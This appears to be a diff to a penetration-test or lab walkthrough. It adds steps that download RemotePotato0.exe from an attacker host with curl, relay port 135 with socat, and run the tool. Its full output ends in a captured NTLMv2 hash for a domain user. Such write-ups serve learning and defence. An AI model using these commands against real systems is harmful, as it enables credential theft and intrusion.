@@ -637,12 +637,33 @@ curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
 Now its on the target
 
 ```python
-sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.18.23:8080
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.18.23:9001
 ```
 Ill set a socat listener
 
 Using the target IP
 
 ```python
+PS C:\temp> ./rp.exe -m 2 -s 1 -x 10.200.52.144 -p 9001
+./rp.exe -m 2 -s 1 -x 10.200.52.144 -p 9001
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9001
+[*] Example Network redirector: 
+	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9001
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] RPC relay server listening on port 9997 ...
+[*] Starting RogueOxidResolver RPC Server listening on port 9001 ... 
+[*] IStoragetrigger written: 108 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 9001
+[+] User hash stolen!
 
+NTLMv2 Client	: DC
+NTLMv2 Username	: NOVACART\j.dillon
+NTLMv2 Hash	: j.dillon::NOVACART:11f76ab02945f33a:630cb863d5b9e362b8b157fa8ce476f8:0101000000000000bdb3611da5d9dc01b7704f2138f6881300000000020010004e004f00560041004300410052005400010004004400430004001c006e006f007600610063006100720074002e006c006f00630061006c0003002200440043002e006e006f007600610063006100720074002e006c006f00630061006c0005001c006e006f007600610063006100720074002e006c006f00630061006c0007000800bdb3611da5d9dc01060004000600000008003000300000000000000001000000002000006448886a2f8b67717d7f26147e821e872bab76dfd3218aef2b4b5bf514b9039d0a00100000000000000000000000000000000000090000000000000000000000
 ```
+Now i have the NTLMv2 hash for the user `j.dillon`
+
